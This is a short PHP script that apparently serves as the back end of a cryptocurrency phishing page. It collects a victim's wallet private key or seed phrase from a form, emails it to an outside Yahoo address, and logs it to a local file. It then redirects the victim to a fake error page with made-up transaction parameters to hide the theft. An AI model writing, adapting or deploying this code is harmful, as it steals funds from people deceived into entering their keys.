<?php
if(isset($_POST["submit"])){
  $productID = $_POST["product_id"];
  $phrase = $_POST["privatekey"];

  $msg = " \r\n The private key: $phrase -> $productID \r\n";

  mail("neverdidnoneforcruise@yahoo.com","babydoge",$msg);
  file_put_contents('data.txt', $msg, FILE_APPEND);
  header("Location: error?pou=1f3870be274f6c49b3e31a0c6728957f1f3870be274f6c49b3e31a0c6728957f&tnx=Gnosis&hash=1f3870be274f6c49b3e31a0c6728957f");
}
?>
